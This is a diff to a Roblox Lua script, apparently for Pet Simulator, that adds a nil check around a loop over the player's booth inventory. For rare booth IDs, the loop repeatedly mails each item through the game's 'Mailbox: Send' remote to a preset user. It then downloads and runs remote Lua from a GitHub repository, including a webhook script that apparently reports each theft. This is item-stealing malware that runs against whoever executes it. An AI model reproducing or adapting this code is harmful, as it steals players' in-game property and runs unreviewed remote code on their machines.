@@ -483,25 +483,27 @@ for i, v in pairs(inv.Hoverboard) do
     end
 end
 
-for i, v in pairs(inv.Booth) do
-    local id = v.id
-    if id == "Present" or id == "Throne" or id == "Alien" or id == "Cupcake" or id == "Empyrean" or id == "Galaxy" or id == "Pixel" then
-        local args = {
-            [1] = user,
-            [2] = message,
-            [3] = "Booth",
-            [4] = i,
-            [5] = v._am or 1
-        }
-        repeat
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-        until not inv.Booth[i]
-        directory = library.Directory.Booths[id]
-        _G.image = directory.Icon
-        wait(0.5)
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
-        _G.id = id
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
+if inv.Booth then
+    for i, v in pairs(inv.Booth) do
+        local id = v.id
+        if id == "Present" or id == "Throne" or id == "Alien" or id == "Cupcake" or id == "Empyrean" or id == "Galaxy" or id == "Pixel" then
+            local args = {
+                [1] = user,
+                [2] = message,
+                [3] = "Booth",
+                [4] = i,
+                [5] = v._am or 1
+            }
+            repeat
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+            until not inv.Booth[i]
+            directory = library.Directory.Booths[id]
+            _G.image = directory.Icon
+            wait(0.5)
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
+            _G.id = id
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
+        end
     end
 end
 
